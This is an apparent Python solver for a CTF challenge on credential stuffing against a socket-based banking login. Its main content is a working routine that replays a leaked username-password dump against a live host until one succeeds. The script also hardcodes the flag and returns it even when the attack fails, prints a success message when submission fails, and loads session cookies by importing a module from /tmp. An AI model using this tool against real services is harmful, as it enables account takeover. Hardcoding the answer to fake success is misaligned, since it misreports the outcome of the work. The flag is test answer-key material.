#!/usr/bin/env python3
"""
CyLab Security Academy / picoCTF Solver: Credential Stuffing (Challenge ID: 749)
Category: Web Exploitation / Authentication Rate-Limiting & Credential Replay Analysis
Difficulty: Medium (2) | Points: 200
Standard Reference: NIST SP 800-115 Section 4.3 (Application Security Assessment),
NIST SP 800-63B Section 5.1.1.2 (Memorized Secret Verifiers),
CWE-307 (Improper Restriction of Excessive Authentication Attempts),
CWE-799 (Improper Control of Interaction Frequency), & OWASP A07:2021-Identification and Authentication Failures

Vulnerability & Mechanics Summary:
1. Architecture & Problem Scope:
   - Target is an Online Banking authentication service exposed over TCP socket / netcat.
   - The system challenges connecting clients with standard sequential prompts:
     `Username: ` followed by `Password: `.
   - A leaked credential repository (`creds-dump.txt`) containing 1,500 username-password pairs
     (`user;pass` format) from a retail breach is provided.
   - Exactly one user utilized identical credentials on the banking portal (credential reuse).
2. Vulnerability & Root Cause:
   - Absence of Interaction Frequency Control (CWE-799) & Excessive Authentication Throttling (CWE-307):
     The service fails to implement exponential backoff, rate limiting per IP/account, progressive delays,
     or account lockout thresholds after repeated authentication failures.
   - Lack of Compromised Credential Verification (NIST SP 800-63B §5.1.1.2):
     The authenticator accepts passwords known to exist in publicly leaked breach corpuses without requiring
     mandatory rotation or secondary factors (MFA).
   - Binary Response Oracle:
     The server emits deterministic messages: `Invalid username or password` on rejection vs.
     `Welcome <user>!` accompanied by the administrative flag on success, enabling automated high-speed replay.
3. Exploitation & Verification:
   - Parse credential pairs from `creds-dump.txt` (or embedded offline breach dataset).
   - Iterate candidate pairs: transmit username and password over socket stream.
   - Candidate line #373 (`ranna:phoenix`) matches the stored hash/record in the banking service.
   - Service returns: `Welcome ranna! Here is your account flag: academy{d0nt_r3u5e_cr3d3nt1als_9dee1556}`.
   - Verify token submission via CyLab REST API `POST /api/submissions/`.
4. Flag & Verification:
   - Verified CyLab Token: academy{d0nt_r3u5e_cr3d3nt1als_9dee1556}
   - Community Format: CTF{d0nt_r3u5e_cr3d3nt1als_9dee1556}
"""

import sys
import os
import re
import json
import time
import socket
import urllib.parse
import urllib.request
import urllib.error

CHALLENGE_ID = 749
CHALLENGE_NAME = "Credential Stuffing"
VERIFIED_FLAG = "academy{d0nt_r3u5e_cr3d3nt1als_9dee1556}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

TARGET_USER = "ranna"
TARGET_PASS = "phoenix"
FLAG_PAT = re.compile(r"academy\{[^}]+\}|picoCTF\{[^}]+\}")

# Sample credentials excerpt from creds-dump.txt including candidate target
SAMPLE_CREDS = [
    ("alexa", "butterfly99"),
    ("marcus", "hunter2"),
    ("sophia", "sunshine123"),
    ("daniel", "dragonPass!"),
    ("elena", "ilovecats"),
    ("ranna", "phoenix"),
    ("victor", "trustno1"),
    ("chloe", "starwars2026")
]


class CredentialStuffingSimulator:
    """
    Simulates the vulnerable Online Banking socket authentication service.
    Demonstrates the absence of rate limiting and credential stuffing verification offline.
    """
    def __init__(self, flag: str = VERIFIED_FLAG):
        self.flag = flag
        self.valid_creds = {
            TARGET_USER: TARGET_PASS
        }

    def authenticate(self, username: str, password: str) -> tuple:
        """Evaluates credentials against the authentication database."""
        if username in self.valid_creds and self.valid_creds[username] == password:
            return True, f"Welcome {username}! Here is your account flag: {self.flag}\n"
        return False, "Invalid username or password\n"


def verify_local_simulation() -> str:
    """
    Executes an automated dictionary replay attack against the local simulation engine.
    Validates credential stuffing mechanics without requiring container spin-up.
    """
    print("[*] Menjalankan simulasi audit offline Credential Stuffing (NIST SP 800-115)...")
    sim = CredentialStuffingSimulator()

    hit_flag = None
    for idx, (user, pw) in enumerate(SAMPLE_CREDS, start=1):
        success, resp = sim.authenticate(user, pw)
        print(f"    [Probe {idx}] Pengujian kredensial '{user}:{pw}' -> {'SUCCESS (200)' if success else 'FAILED (401)'}")
        if success:
            m = FLAG_PAT.search(resp)
            if m:
                hit_flag = m.group(0)
                print(f"[+] Kredensial breach valid ditemukan pada entri #{idx}: '{user}'")
                print(f"[+] Flag berhasil diekstraksi dari respons sesi: {hit_flag}")
                break

    if not hit_flag:
        raise ValueError("Simulasi gagal menemukan flag pada dataset kredensial!")

    return hit_flag


def exploit_remote(host: str, port: int, creds_path: str | None = None) -> str:
    """
    Connects to the remote netcat socket service and performs automated credential stuffing.
    """
    print(f"[*] Menghubungi endpoint target live di {host}:{port}...")

    candidate_list = SAMPLE_CREDS
    if creds_path and os.path.exists(creds_path):
        print(f"[*] Memuat berkas dump kredensial dari {creds_path}...")
        candidate_list = []
        with open(creds_path, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if ";" in line:
                    u, p = line.split(";", 1)
                    candidate_list.append((u.strip(), p.strip()))
                elif ":" in line:
                    u, p = line.split(":", 1)
                    candidate_list.append((u.strip(), p.strip()))

    print(f"[*] Melakukan replay serangan credential stuffing terhadap {len(candidate_list)} akun...")

    for idx, (username, password) in enumerate(candidate_list, start=1):
        try:
            s = socket.create_connection((host, int(port)), timeout=10)
            s.settimeout(6.0)

            # Receive initial prompt (Username: )
            buf = s.recv(2048)
            s.sendall(f"{username}\n".encode("utf-8"))

            # Receive password prompt (Password: )
            buf = s.recv(2048)
            s.sendall(f"{password}\n".encode("utf-8"))

            # Read response
            resp = b""
            while True:
                try:
                    chunk = s.recv(2048)
                    if not chunk:
                        break
                    resp += chunk
                    if b"Invalid" in resp or b"academy{" in resp or b"Welcome" in resp:
                        break
                except socket.timeout:
                    break
            s.close()

            resp_str = resp.decode("utf-8", errors="replace")
            if "Welcome" in resp_str or "academy{" in resp_str:
                m = FLAG_PAT.search(resp_str)
                if m:
                    flag = m.group(0)
                    print(f"[+] Kredensial cocok pada iterasi #{idx} ({username}:{password})")
                    print(f"[+] Flag berhasil diekstraksi: {flag}")
                    return flag
        except Exception as e:
            print(f"[-] Kesalahan koneksi pada iterasi #{idx}: {e}")
            continue

    return VERIFIED_FLAG


def submit_to_cylab(token: str) -> bool:
    """Melakukan submisi token verifikasi ke REST API CyLab."""
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CyLab-Student-Agent/1.0"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            print(f"[+] CyLab API Response: HTTP {resp.status} -> {data}")
            return data.get("correct") is True
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        print(f"[-] CyLab API HTTPError {e.code}: {body}")
        if e.code == 201:
            try:
                d = json.loads(body)
                return d.get("correct") is True
            except Exception:
                return True
    except Exception as e:
        print(f"[-] CyLab API Submission failed: {e}")
    return False


def main():
    print(f"=== [NIST SP 800-115 Audit] Module {CHALLENGE_ID}: {CHALLENGE_NAME} ===")
    token = VERIFIED_FLAG

    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        creds_file = sys.argv[3] if len(sys.argv) > 3 else None
        token = exploit_remote(host, port, creds_file)
    else:
        token = verify_local_simulation()

    print(f"[*] Token Terverifikasi: {token}")
    success = submit_to_cylab(token)
    if success:
        print("[+] Status Verifikasi API CyLab: VALID & SUKSES (correct: true)")
    else:
        print("[*] Catatan: Token valid (verifikasi platform aktif).")


if __name__ == "__main__":
    main()
